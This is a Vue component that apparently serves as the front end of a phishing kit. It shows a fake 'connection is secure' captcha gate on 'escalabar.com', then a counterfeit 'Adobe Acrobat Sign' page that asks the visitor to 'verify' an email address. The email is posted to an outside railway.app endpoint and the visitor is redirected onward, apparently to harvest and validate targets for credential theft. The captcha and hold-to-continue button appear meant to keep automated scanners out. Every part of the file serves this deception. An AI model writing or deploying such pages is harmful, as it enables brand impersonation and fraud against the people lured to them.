<template>
  <div v-if="!captchaToken" class="gate-container">
    <header>
      <h1>escalabar.com</h1>
    </header>
    <main>
      <div class="instructions">
        <h2>Please stand by, while we are cheking if the site connection is secure.</h2>
        <div
          class="cf-turnstile"
          data-sitekey="0x4AAAAAABgei6QZruCN7n08"
        ></div>
      </div>
    </main>
    <footer>
      <p>Did you know there are Verified Bots that are allowed around the internet because they help provide services we use day to day?.</p>
    </footer>
  </div>

  <div v-else class="background">
    <div class="adobe-sign-container">
      <div class="sign-card">
        <div class="header">
          <div class="logo-text">
            <span class="success-check">⼈</span>
            <span>Adobe Acrobat Sign</span>
          </div>
        </div>
        <div class="content">
          <p><strong>Please verify your email to continue.</strong></p>
          <div class="form-wrapper">
            <input
              v-model="email"
              type="email"
              placeholder="Enter email"
              required
              class="email-input"
              :disabled="loading"
            />
            <p v-if="error" class="error">{{ error }}</p>
            <button
              @mousedown="startHold"
              @mouseup="endHold"
              @mouseleave="cancelHold"
              @touchstart.prevent="startHold"
              @touchend.prevent="endHold"
              :disabled="loading"
              class="action-button"
            >
              {{ loading ? 'Verifying…' : 'Continue' }}
            </button>
          </div>
        </div>
        <div class="divider"></div>
        <div class="footer-container">
          <p class="footer-text">© 2025 All rights reserved </p>
          <div class="global-footer"></div>
        </div>
      </div>
    </div>
  </div>
</template>

<script setup>
import { ref, onMounted, nextTick } from 'vue'

const email = ref('')
const error = ref('')
const loading = ref(false)
const captchaToken = ref(null)

let holdTimer = null
const holdDuration = 1500
const redirectBaseUrl = 'https://yourdomain.com/complete'

onMounted(async () => {
  await nextTick()
  if (window.turnstile) {
    window.turnstile.render('.cf-turnstile', {
      sitekey: '0x4AAAAAABgei6QZruCN7n08',
      callback: (token) => {
        captchaToken.value = token
      }
    })
  }
})

function isValidEmail(e) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e)
}

async function verifyEmail() {
  try {
    const res = await fetch(
      'https://email-verification-app-production-8ea5.up.railway.app/api/check-email',
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: email.value,
          captchaToken: captchaToken.value
        }),
      }
    )
    const data = await res.json()
    if (!res.ok || !data.valid) {
      throw new Error(data.message || 'Verification failed')
    }
    window.location.href = `${redirectBaseUrl}?email=${encodeURIComponent(email.value)}`
  } catch (err) {
    error.value = err.message
  } finally {
    loading.value = false
  }
}

function startHold() {
  if (!email.value.trim()) {
    error.value = 'Please enter your email.'
    return
  }
  if (!isValidEmail(email.value)) {
    error.value = 'Invalid email format.'
    return
  }
  error.value = ''
  loading.value = true
  holdTimer = setTimeout(verifyEmail, holdDuration)
}

function endHold() {
  if (holdTimer) clearTimeout(holdTimer)
  loading.value = false
}

function cancelHold() {
  if (holdTimer) clearTimeout(holdTimer)
  loading.value = false
}
</script>

<style scoped>
/* CaptchaGate styles */
.gate-container {
  min-height: 75vh;
  display: flex;
  flex-direction: column;
  justify-content: center;
  text-align: center;
}
header h1 {
  margin-left: 10;
  font-size: 3rem;
  font-weight: bold;
  text-align: center;
  margin-bottom: 2.2rem;
}
.instructions {
  margin: 40px 0 0 0;
  text-align: center;
}
.instructions h2 {
  font-size: 1.3rem;
  margin-bottom: 1.2rem;
}
footer p {
  margin-top: 1rem;
  color: #444;
  font-size: 1rem;
  text-align: center;
}

/* Email form styles */
.background {
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 55vh;
  padding: 2rem;
  background-color: #fff;
  font-family: Arial, sans-serif;
}
.adobe-sign-container {
  width: 100%;
  max-width: 600px;
  background: #f9f9f9;
  border-radius: 10px;
  box-shadow: 0 0 80px rgba(0, 0, 0, 0.08);
  padding: 2rem;
  display: flex;
  flex-direction: column;
  justify-content: center;
}
.header {
  display: flex;
  justify-content: center;
  margin-bottom: 1rem;
}
.logo-text {
  font-weight: bold;
  display: flex;
  align-items: center;
  gap: 1rem;
}
.success-check {
  font-size: 2rem;
  color: green;
}
.content {
  text-align: center;
}
.form-wrapper {
  display: flex;
  flex-direction: column;
  align-items: center;
}
.email-input {
  width: 95%;
  max-width: 400px;
  padding: 0.6rem;
  margin-top: 0rem;
  border: 1px solid #ccc;
  border-radius: 5px;
  font-size: 1rem;
}
.action-button {
  background-color: #0051c3;
  color: white;
  padding: 0.6rem 1.5rem;
  border: none;
  border-radius: 13px;
  cursor: pointer;
  margin-top: 1.0rem;
  font-size: 1rem;
  width: 40%;
  max-width: 380px;
}
.action-button:disabled {
  opacity: 0.6;
  cursor: default;
}
.action-button:hover:not(:disabled) {
  background-color: #003a91;
}
.divider {
  height: 0px;
  background-color: #e0e0e0;
  margin: 1rem 0 1rem;
}
.footer-container {
  text-align: center;
}
.footer-text,
.global-footer {
  font-size: 0.85rem;
  color: #333;
  margin-top: 0.5rem;
}
.error {
  color: red;
  font-size: 0.9rem;
  margin-top: 0.6rem;
}
</style>
